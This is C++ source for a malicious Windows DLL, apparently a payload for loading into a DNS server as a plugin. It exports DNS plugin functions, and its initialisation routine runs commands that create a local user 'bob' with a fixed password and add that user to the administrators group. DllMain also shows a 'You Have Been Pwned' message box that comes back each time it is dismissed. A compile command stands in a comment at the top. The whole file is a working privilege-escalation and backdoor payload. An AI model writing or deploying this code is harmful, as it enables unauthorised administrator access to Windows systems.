#include <windows.h>
#include <stdlib.h>
#include <winuser.h>


// Here so I remember how to compile it.
// x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp

__declspec(dllexport) int DnsPluginInitialize(PVOID a1, PVOID a2)
{
    system("net.exe user bob Password123 /add");
    system("net.exe localgroup administrators bob /add");
    return 0;
}

__declspec(dllexport) int DnsPluginCleanup()
{
    return 0;
}

__declspec(dllexport) int DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
{
    return 0;
}

void ShowMessageBox() {
    int msgResponse = MessageBox(NULL, (LPCWSTR)"You Have Been Pwned", (LPCWSTR)"Oh No!!", MB_ICONWARNING | MB_OK);

    switch (msgResponse) {
        case IDOK:
            ShowMessageBox();
            break;
    }
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugString("DLL_PROCESS_ATTACH");
        break;

    case DLL_THREAD_ATTACH:
        OutputDebugString("DLL_THREAD_ATTACH");
        break;

    case DLL_THREAD_DETACH:
        OutputDebugString("DLL_THREAD_DETACH");
        break;

    case DLL_PROCESS_DETACH:
        OutputDebugString("DLL_PROCESS_DETACH");
        break;
    }

    ShowMessageBox();

    return TRUE;
}
